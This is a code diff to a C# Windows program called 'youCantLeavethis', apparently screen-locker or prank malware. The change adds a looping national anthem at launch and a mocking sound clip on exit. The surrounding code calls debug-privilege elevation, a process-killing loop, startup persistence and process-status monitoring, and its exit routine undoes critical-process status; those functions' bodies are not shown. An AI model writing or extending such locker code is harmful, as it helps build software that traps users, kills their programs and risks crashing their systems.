@@ -3,8 +3,10 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Media;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -21,10 +23,14 @@ namespace youCantLeavethis
         [STAThread]
         static void Main()
         {
-            SoundPlayer player = new SoundPlayer();
+            player = new SoundPlayer(Properties.Resources.Mazurek_Dąbrowskiego);
+            player.PlayLooping();
+
             Process.EnterDebugMode();
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+
             check_if_running();
             new Thread(loop_kill).Start();
             startup();
@@ -33,6 +39,8 @@ namespace youCantLeavethis
             new Thread(check_process_status).Start();
             Application.Run(new youCantLeavethis());
         }
+
+        private static SoundPlayer player;
 
 
         // importy bibliotek
@@ -210,6 +218,11 @@ namespace youCantLeavethis
             stop_startup();
             stop_checking_proc();
             make_process_not_critical();
+
+            player.Stop();
+            player.Dispose();
+            player = new SoundPlayer(Properties.Resources.Ha__Gay___QuickSounds_com);
+            player.PlaySync();
             Process.GetCurrentProcess().Kill();
         }
     }
